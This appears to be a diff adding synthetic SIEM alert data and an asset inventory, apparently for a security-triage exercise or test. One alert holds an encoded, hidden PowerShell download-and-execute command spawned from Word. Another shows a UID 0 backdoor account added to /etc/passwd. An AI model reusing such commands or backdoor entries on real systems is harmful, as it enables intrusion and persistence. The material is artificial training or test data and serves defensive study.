@@ -1,0 +1,259 @@
+{
+ "alerts": [
+  {
+   "id": "A-1008",
+   "timestamp": "2026-10-21T16:43:55Z",
+   "rule_id": "100210",
+   "level": 13,
+   "agent": "FIN-LT-0147",
+   "agent_ip": "10.30.8.47",
+   "title": "Outbound connection to IP on threat intel blocklist (CDB list: known-bad C2)",
+   "groups": [
+    "sysmon",
+    "network",
+    "threat_intel"
+   ],
+   "details": {
+    "destination_ip": "45.95.147.236",
+    "destination_port": 443,
+    "process": "rundll32.exe",
+    "bytes_out": 184320,
+    "list": "malicious-ioc/c2-ips (sample custom rule)",
+    "connections_10min": 23
+   }
+  },
+  {
+   "id": "A-1001",
+   "timestamp": "2026-10-21T16:41:07Z",
+   "rule_id": "5712",
+   "level": 10,
+   "agent": "web-prod-02",
+   "agent_ip": "10.20.4.12",
+   "title": "sshd: brute force trying to get access to the system. Non existent user.",
+   "groups": [
+    "syslog",
+    "sshd",
+    "authentication_failures"
+   ],
+   "details": {
+    "srcip": "185.220.101.47",
+    "dstuser": "admin",
+    "failed_attempts_2min": 148,
+    "decoder": "sshd",
+    "location": "/var/log/auth.log",
+    "successful_login_after": false
+   }
+  },
+  {
+   "id": "A-1002",
+   "timestamp": "2026-10-21T16:38:52Z",
+   "rule_id": "92057",
+   "level": 12,
+   "agent": "FIN-LT-0147",
+   "agent_ip": "10.30.8.47",
+   "title": "Powershell process spawned with encoded command (possible obfuscation)",
+   "groups": [
+    "windows",
+    "sysmon",
+    "sysmon_eid1_detections"
+   ],
+   "details": {
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...",
+    "user": "CORP\\j.doe"
+   }
+  },
+  {
+   "id": "A-1003",
+   "timestamp": "2026-10-21T16:30:15Z",
+   "rule_id": "510",
+   "level": 7,
+   "agent": "db-prod-01",
+   "agent_ip": "10.20.6.21",
+   "title": "Host-based anomaly detection event (rootcheck).",
+   "groups": [
+    "ossec",
+    "rootcheck"
+   ],
+   "details": {
+    "rootcheck_title": "Trojaned version of file detected.",
+    "file": "/usr/bin/netstat",
+    "signature": "Generic",
+    "last_package_update": "2026-10-14"
+   }
+  },
+  {
+   "id": "A-1004",
+   "timestamp": "2026-10-21T16:22:40Z",
+   "rule_id": "550",
+   "level": 7,
+   "agent": "web-prod-02",
+   "agent_ip": "10.20.4.12",
+   "title": "Integrity checksum changed.",
+   "groups": [
+    "ossec",
+    "syscheck",
+    "syscheck_entry_modified",
+    "syscheck_file"
+   ],
+   "details": {
+    "path": "/etc/passwd",
+    "mode": "realtime",
+    "changed_attributes": [
+     "size",
+     "mtime",
+     "md5",
+     "sha1",
+     "sha256"
+    ],
+    "size_before": 2318,
+    "size_after": 2371,
+    "diff": "+ svc_backup:x:0:0::/home/svc_backup:/bin/bash",
+    "audit_user": "root (via sudo from user 'deploy')"
+   }
+  },
+  {
+   "id": "A-1005",
+   "timestamp": "2026-10-21T16:15:03Z",
+   "rule_id": "87105",
+   "level": 12,
+   "agent": "HR-WS-0022",
+   "agent_ip": "10.30.9.22",
+   "title": "VirusTotal: Alert - C:\\Users\\m.smith\\Downloads\\Invoice_Oct.pdf.exe - 47 engines detected this file",
+   "groups": [
+    "virustotal"
+   ],
+   "details": {
+    "sha256": "e3b0c4...d1f9 (sample)",
+    "positives": 47,
+    "total": 72,
+    "file": "C:\\Users\\m.smith\\Downloads\\Invoice_Oct.pdf.exe",
+    "executed": "unknown"
+   }
+  },
+  {
+   "id": "A-1006",
+   "timestamp": "2026-10-21T16:09:31Z",
+   "rule_id": "91545",
+   "level": 10,
+   "agent": "office365-tenant",
+   "agent_ip": "n/a (cloud)",
+   "title": "Office 365: Successful sign-in from two distant locations in a short time (impossible travel)",
+   "groups": [
+    "office365",
+    "AzureActiveDirectory",
+    "impossible_travel"
+   ],
+   "details": {
+    "user": "cfo@client-sample.example",
+    "login_1": "Dallas, US 15:52Z",
+    "login_2": "Lagos, NG 16:08Z",
+    "mfa": "satisfied via SMS on login_2",
+    "client_app": "Browser",
+    "operation": "UserLoggedIn"
+   }
+  },
+  {
+   "id": "A-1007",
+   "timestamp": "2026-10-21T15:58:12Z",
+   "rule_id": "60154",
+   "level": 12,
+   "agent": "DC-01",
+   "agent_ip": "10.10.1.5",
+   "title": "Administrators Group Changed: user added to Domain Admins",
+   "groups": [
+    "windows",
+    "windows_security",
+    "group_changed",
+    "win_group_changed"
+   ],
+   "details": {
+    "eventID": 4728,
+    "member": "CORP\\it.temp01",
+    "group": "Domain Admins",
+    "changed_by": "CORP\\helpdesk03",
+    "change_ticket": "none found in Kaseya BMS (sample)",
+    "time_local": "after hours"
+   }
+  },
+  {
+   "id": "A-1009",
+   "timestamp": "2026-10-21T15:40:20Z",
+   "rule_id": "5503",
+   "level": 5,
+   "agent": "FIN-LT-0147",
+   "agent_ip": "10.30.8.47",
+   "title": "PAM: User login failed.",
+   "groups": [
+    "pam",
+    "syslog",
+    "authentication_failed"
+   ],
+   "details": {
+    "user": "j.doe",
+    "failed_attempts": 3,
+    "window": "40 seconds",
+    "followed_by": "successful interactive logon by same user from same console (rule 5501)",
+    "source": "local console",
+    "time_local": "08:40 business hours"
+   }
+  }
+ ],
+ "assets": {
+  "web-prod-02": {
+   "owner": "Web Ops (sample)",
+   "os": "Ubuntu 22.04 LTS",
+   "role": "Public web server (production)",
+   "patch_status": "2 security updates pending",
+   "last_seen": "1 min ago",
+   "criticality": "High",
+   "kaseya_agent": "online"
+  },
+  "FIN-LT-0147": {
+   "owner": "J. Doe, Finance (sample)",
+   "os": "Windows 11 Pro 23H2",
+   "role": "User laptop",
+   "patch_status": "Up to date",
+   "last_seen": "just now",
+   "criticality": "Medium",
+   "kaseya_agent": "online"
+  },
+  "db-prod-01": {
+   "owner": "Database team (sample)",
+   "os": "RHEL 9.3",
+   "role": "Production database",
+   "patch_status": "5 updates pending (1 critical)",
+   "last_seen": "2 min ago",
+   "criticality": "Critical",
+   "kaseya_agent": "online"
+  },
+  "HR-WS-0022": {
+   "owner": "M. Smith, HR (sample)",
+   "os": "Windows 10 Pro 22H2",
+   "role": "User workstation",
+   "patch_status": "3 critical patches missing",
+   "last_seen": "just now",
+   "criticality": "Medium",
+   "kaseya_agent": "online"
+  },
+  "office365-tenant": {
+   "owner": "CFO account (sample)",
+   "os": "Microsoft 365 (cloud identity)",
+   "role": "Executive identity",
+   "patch_status": "n/a",
+   "last_seen": "n/a",
+   "criticality": "Critical",
+   "kaseya_agent": "n/a (cloud)"
+  },
+  "DC-01": {
+   "owner": "IT Infrastructure (sample)",
+   "os": "Windows Server 2022",
+   "role": "Domain controller",
+   "patch_status": "Up to date",
+   "last_seen": "just now",
+   "criticality": "Critical",
+   "kaseya_agent": "online"
+  }
+ }
+}
